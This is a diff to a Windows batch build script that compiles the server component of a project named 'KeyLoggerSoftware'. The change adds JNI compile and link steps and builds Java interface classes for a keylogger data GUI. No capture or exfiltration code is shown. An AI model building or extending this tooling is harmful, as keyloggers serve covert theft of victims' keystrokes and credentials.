@@ -22,7 +22,13 @@ if /I "%windowd%" EQU "Y" goto :ServerCompiler
 if /I "%windowd%" EQU "N" goto :exit
 goto :Server
 :ServerCompiler
-mingw32-g++ -std=c++11 .\KeyLoggerSoftware\Server\main.cpp -lws2_32  -o .\KeyLoggerSoftware\server\keylogserverServer.exe 
+echo %cd%
+mingw32-g++.exe  -O2 -std=c++11 -I"C:\Program Files (x86)\Java\jdk1.8.0_191\include" -I"C:\Program Files\Java\jdk1.8.0_191\include\win32" -I"C:\Program Files (x86)\Java\jdk1.8.0_191\include\win32" -I"C:\Program Files (x86)\Java\jdk1.8.0_191\include" -c %cd%\KeyLoggerSoftware\server\main.cpp -o %cd%\KeyLoggerSoftware\server\keyloggerserver.o
+mingw32-g++.exe -L"C:\Program Files (x86)\Java\jdk1.8.0_191\jre\bin\server" -L"C:\Program Files (x86)\Java\jdk1.8.0_191\jre\bin\plugin2" -L"C:\Program Files (x86)\Java\jdk1.8.0_191\jre\bin\server" -L"C:\Program Files (x86)\Java\jre1.8.0_191\bin\client" -o %cd%\KeyLoggerSoftware\server\keyloggerServerGui.exe %cd%\KeyLoggerSoftware\server\keyloggerserver.o  -s -lws2_32 -std=c++11  "C:\Program Files (x86)\Java\jdk1.8.0_191\lib\jvm.lib" "C:\Program Files (x86)\Java\jdk1.8.0_191\lib\jawt.lib"
+mkdir %cd%\KeyLoggerSoftware\Server\KeyLoggerinterface\build\classes
+javac -d %cd%\KeyLoggerSoftware\Server\KeyLoggerInterface\build\classes %cd%\KeyLoggerSoftware\Server\KeyLoggerInterface\src\keylogdata.java
+javac -d %cd%\KeyLoggerSoftware\Server\KeyLoggerInterface\build\classes %cd%\KeyLoggerSoftware\Server\KeyLoggerInterface\src\keyloggerInterface.java
+
 echo complete
 
 :exit
